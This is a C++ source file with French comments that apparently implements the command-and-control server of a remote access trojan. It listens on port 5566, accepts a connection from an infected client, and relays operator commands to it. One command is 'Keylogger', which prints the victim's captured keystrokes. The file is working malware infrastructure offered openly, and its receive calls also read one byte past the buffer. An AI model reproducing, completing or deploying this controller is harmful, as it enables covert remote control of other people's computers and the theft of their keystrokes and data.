//Si nous sommes sous Windows
#if defined (WIN32)
    #include <winsock2.h>
    typedef int socklen_t;
#elif defined (__linux__)
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>

    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket(s) close(s)

    typedef int SOCKET;
    typedef struct sockaddr_in SOCKADDR_IN;
    typedef struct sockaddr SOCKADDR;
#endif

#include <iostream>
#include <string>
#include <fstream>
#include <string.h>

using namespace std;

int main(void) {
    #if defined (WIN32)
        WSADATA WSAData;
        WSAStartup(MAKEWORD(2,2), &WSAData);
    #endif

    // ICI on mettra notre code sur les sockets
    string commande, mess;
    char reponse[16384];
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    SOCKET csock;
    SOCKADDR_IN sin;
    SOCKADDR_IN csin;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(5566);
    bind(sock, (SOCKADDR *)&sin, sizeof(sin));
    listen(sock, 0);
    cout << "En attente..." << endl;

    int sinsize = sizeof(csin);
    if ((csock = accept(sock, (SOCKADDR*)&csin, (socklen_t*)&sinsize)) != INVALID_SOCKET) {
        getpeername(csock, (SOCKADDR*)&csin, (socklen_t*)&sinsize);
        mess = inet_ntoa(csin.sin_addr);
        cout << mess << endl;

        while (true) {
            cout << "1>";
            getline(cin, commande);
            int test = send(csock, commande.c_str(), commande.size() + 1, 0);

            if (test == SOCKET_ERROR || test == 0) {
                cout << "une erreur est survenue lors de l'envoi" << endl;
                break;
            }
            if (commande[0] == 'C' || commande[0] == 'D') {
                /* int test2 = */ recv(csock, reponse, sizeof(reponse) + 1, 0);
                cout << reponse << endl;
            }
            else if (commande == "Keylogger") {
                recv(csock, reponse, sizeof(reponse) + 1, 0);
                cout << reponse;
            }
            else {
                memset(reponse, 0, sizeof(reponse));
                int test2 = recv(csock, reponse, sizeof(reponse) + 1, 0);
                if (test2 == 0 || test2 == SOCKET_ERROR) {
                    cout << "Aucune reception" << endl;
                    break;
                }
                else
                    cout << reponse << endl;
            }
        }
    }
    else {
        cout << "deconnection" << endl;
    }

    #if defined (WIN32)
        WSACleanup();
    #endif
    return EXIT_SUCCESS;
}